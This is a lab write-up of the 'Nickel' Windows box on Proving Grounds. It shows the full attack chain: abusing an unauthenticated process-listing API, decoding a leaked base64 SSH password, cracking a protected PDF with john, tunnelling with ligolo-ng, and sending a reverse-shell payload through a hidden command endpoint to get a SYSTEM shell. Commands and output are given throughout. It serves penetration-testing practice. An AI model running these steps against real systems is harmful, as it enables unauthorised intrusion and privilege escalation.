---
machine: Nickel
platform: Proving Grounds
category: Windows
difficulty: Hard
tags: [custom-api, credential-hunting, pdf-cracking, ligolo, command-injection]
date: 2026-08-06
status: retired
summary: A Windows box exposing a pair of undocumented internal HTTP APIs — testing HTTP-verb and header manipulation to coax data out of an unauthenticated process-listing endpoint, credential hunting across a leaked command line and a password-protected PDF, pivoting to an internal-only API via a tunnel, and abusing a hidden arbitrary-command endpoint for SYSTEM.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ nmap-full 192.168.240.99
[*] Running fast port discovery on 192.168.240.99...
[sudo] password for kali: 
[*] Open ports: 21,22,135,139,445,3389,5040,7680,8089,33333,49664,49665,49666,49667,49668,49669,49670
[*] Running full scan on 192.168.240.99...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 22:02 -0400
Nmap scan report for 192.168.240.99
Host is up (0.073s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2026-08-06T01:59:53
|_Not valid after:  2027-02-05T01:59:53
|_ssl-date: 2026-08-07T02:06:34+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2026-08-07T02:05:27+00:00
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-07T02:05:31
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.91 seconds
```

We have two webapps on port 8089, 33333

```text
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
```

The port 8089 webapp has a strange endpoint when you press the buttons that appends `list-current-deployments?` to the web root and fails to connect.

## Foothold

We can try altering the GET to a POST:

```bash
──(kali㉿kali)-[~/oscp/nickel]
└─$ curl -X POST http://192.168.240.99:33333/list-active-nodes
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Length Required</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Length Required</h2>
<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
</BODY></HTML>
```

We now get a "must have content length" error. We can add that as a header.

This yields a new output:

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ curl -X POST http://192.168.240.99:33333/list-active-nodes -H "Content-Length: 0"      
<p>Not Implemented</p> 
```

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ curl -X POST http://192.168.240.99:33333/list-running-procs -H "Content-Length: 0"


name        : System Idle Process
commandline : 

name        : System
commandline : 

name        : Registry
commandline : 

name        : smss.exe
commandline : 

name        : csrss.exe
commandline : 

name        : wininit.exe
commandline : 

name        : csrss.exe
commandline : 

name        : winlogon.exe
commandline : winlogon.exe

name        : services.exe
commandline : 

name        : lsass.exe
commandline : C:\Windows\system32\lsass.exe

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : dwm.exe
commandline : "dwm.exe"

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws80.ps1

name        : Memory Compression
commandline : 

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"

name        : VGAuthService.exe
commandline : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

name        : vm3dservice.exe
commandline : C:\Windows\system32\vm3dservice.exe

name        : vmtoolsd.exe
commandline : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

name        : vm3dservice.exe
commandline : vm3dservice.exe -n

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : LogonUI.exe
commandline : "LogonUI.exe" /flags:0x2 /state0:0xa3949855 /state1:0x41c64e6d

name        : msdtc.exe
commandline : C:\Windows\System32\msdtc.exe

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : MicrosoftEdgeUpdate.exe
commandline : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c

name        : SgrmBroker.exe
commandline : 

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

name        : WmiApSrv.exe
commandline : C:\Windows\system32\wbem\WmiApSrv.exe
```

We see creds in the cmd.exe process:

```text
--user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

Our last API request is also not implemented:

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ curl -X POST http://192.168.240.99:33333/list-active-nodes -H "Content-Length: 0"
<p>Not Implemented</p> 
```

We attempt to ssh in with `ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK` but the creds fail. I then think that the password may be base64, so I decode it and find: `NowiseSloopTheory139`

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ ssh ariah@target              
The authenticity of host 'target (192.168.240.99)' can't be established.
ED25519 key fingerprint is: SHA256:e25NU8Sljo45nzplpVGugSC5xB5vToeqoHPYJkQqbPU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ariah@target's password: 
Permission denied, please try again.

┌──(kali㉿kali)-[~/oscp/nickel]
└─$ echo -n 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d
NowiseSloopTheory139
```

We can use this credential to ssh into ariah and get the foothold and local.txt:

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ ssh ariah@target                                  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ariah@target's password: 
Microsoft Windows [Version 10.0.18362.1016]         
(c) 2019 Microsoft Corporation. All rights reserved.

ariah@NICKEL C:\Users\ariah>
```

## Privilege Escalation

We find a file called Infrastructure.pdf in the ftp share and scp it down to our local box.

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ scp ariah@target:/ftp/Infrastructure.pdf /home/kali/oscp/nickel/Infra.pdf 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ariah@target's password: 
Infrastructure.pdf
```

We try to open it but its password locked! We use pdf2john to convert the file to a hash and then crack it with john and rockyou.txt to find the password and open the file.

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ariah4168        (Infra.pdf)     
1g 0:00:00:25 DONE (2026-08-06 22:41) 0.03909g/s 391100p/s 391100c/s 391100C/s ariah4168..aria_1988
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed. 
```

The pdf shows:

```text
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```

We perform netstat -ano and find that there is a service on loopback port 80 and 14147.

We setup ligolo-ng so we can access the loopback from our kali and then run an nmap enumeration scan on the ports:

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ nmap -sT -sCV -p 80,14147 244.0.0.1
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 22:54 -0400
Nmap scan report for 244.0.0.1
Host is up (0.018s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
14147/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, NULL: 
|     appear to be behind a NAT router. Please configure the passive mode settings and forward a range of ports in your router.
|     Warning: FTP over TLS is not enabled, users cannot securely log in.
|   GetRequest, HTTPOptions, RTSPRequest: 
|     appear to be behind a NAT router. Please configure the passive mode settings and forward a range of ports in your router.
|     Warning: FTP over TLS is not enabled, users cannot securely log in.
|_    Protocol error: Unknown command type, closing connection.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port14147-TCP:V=7.99%I=7%D=8/6%Time=6A7548F6%P=x86_64-pc-linux-gnu%r(NU
SF:LL,E0,"FZS\0\x04\0`\t\0\0\x04\0@\x01\0\x01\0\0\0\0\x06~\0\0\0\x01You\x2
SF:0appear\x20to\x20be\x20behind\x20a\x20NAT\x20router\.\x20Please\x20conf
SF:igure\x20the\x20passive\x20mode\x20settings\x20and\x20forward\x20a\x20r
SF:ange\x20of\x20ports\x20in\x20your\x20router\.\x06D\0\0\0\x01Warning:\x2
SF:0FTP\x20over\x20TLS\x20is\x20not\x20enabled,\x20users\x20cannot\x20secu
SF:rely\x20log\x20in\.")%r(GenericLines,E0,"FZS\0\x04\0`\t\0\0\x04\0@\x01\
SF:0\x01\0\0\0\0\x06~\0\0\0\x01You\x20appear\x20to\x20be\x20behind\x20a\x2
SF:0NAT\x20router\.\x20Please\x20configure\x20the\x20passive\x20mode\x20se
SF:ttings\x20and\x20forward\x20a\x20range\x20of\x20ports\x20in\x20your\x20
SF:router\.\x06D\0\0\0\x01Warning:\x20FTP\x20over\x20TLS\x20is\x20not\x20e
SF:nabled,\x20users\x20cannot\x20securely\x20log\x20in\.")%r(GetRequest,11
SF:F,"FZS\0\x04\0`\t\0\0\x04\0@\x01\0\x01\0\0\0\0\x06~\0\0\0\x01You\x20app
SF:ear\x20to\x20be\x20behind\x20a\x20NAT\x20router\.\x20Please\x20configur
SF:e\x20the\x20passive\x20mode\x20settings\x20and\x20forward\x20a\x20range
SF:\x20of\x20ports\x20in\x20your\x20router\.\x06D\0\0\0\x01Warning:\x20FTP
SF:\x20over\x20TLS\x20is\x20not\x20enabled,\x20users\x20cannot\x20securely
SF:\x20log\x20in\.\x06:\0\0\0\x01Protocol\x20error:\x20Unknown\x20command\
SF:x20type,\x20closing\x20connection\.")%r(HTTPOptions,11F,"FZS\0\x04\0`\t
SF:\0\0\x04\0@\x01\0\x01\0\0\0\0\x06~\0\0\0\x01You\x20appear\x20to\x20be\x
SF:20behind\x20a\x20NAT\x20router\.\x20Please\x20configure\x20the\x20passi
SF:ve\x20mode\x20settings\x20and\x20forward\x20a\x20range\x20of\x20ports\x
SF:20in\x20your\x20router\.\x06D\0\0\0\x01Warning:\x20FTP\x20over\x20TLS\x
SF:20is\x20not\x20enabled,\x20users\x20cannot\x20securely\x20log\x20in\.\x
SF:06:\0\0\0\x01Protocol\x20error:\x20Unknown\x20command\x20type,\x20closi
SF:ng\x20connection\.")%r(RTSPRequest,11F,"FZS\0\x04\0`\t\0\0\x04\0@\x01\0
SF:\x01\0\0\0\0\x06~\0\0\0\x01You\x20appear\x20to\x20be\x20behind\x20a\x20
SF:NAT\x20router\.\x20Please\x20configure\x20the\x20passive\x20mode\x20set
SF:tings\x20and\x20forward\x20a\x20range\x20of\x20ports\x20in\x20your\x20r
SF:outer\.\x06D\0\0\0\x01Warning:\x20FTP\x20over\x20TLS\x20is\x20not\x20en
SF:abled,\x20users\x20cannot\x20securely\x20log\x20in\.\x06:\0\0\0\x01Prot
SF:ocol\x20error:\x20Unknown\x20command\x20type,\x20closing\x20connection\
SF:.");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.78 seconds
```

The goal as per the pdf is to execute commands with the `http://192.168.45.169/?whoami` for arbitrary command execution.

I have some difficulty URL encoding payloads into the ? command parameter, so I scp a reverse shell to a writable directory and just write the path to the file as the argument:

NOTE: in the writeup they remedied the curl encoding with this:

```bash
Finally, we can issue the final `curl` request to execute our payload.
kali@kali:~$ curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'
```

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ scp reverse.exe ariah@192.168.240.99:\Users\ariah\Documents\rev.exe 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ariah@192.168.240.99's password: 
reverse.exe                                                                                                                        100% 7680   108.6KB/s   00:00
```

You could make the curl request via the prior ligolo setup or just curl loopback on via the ssh shell:

```powershell
PS C:\Users\ariah\Documents> curl http://127.0.0.1/?C:\Users\ariah\Documents\rev.exe
```

```bash
┌──(kali㉿kali)-[~/oscp/nickel]
└─$ sudo rlwrap -cAr nc -lvnp 445
[sudo] password for kali: 
listening on [any] 445 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.240.99] 50080
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved. 

C:\Windows\system32>whoami
whoami                                                           
nt authority\system
```

We have a SYSTEM shell and can read the proof.txt from the Administrator's desktop.
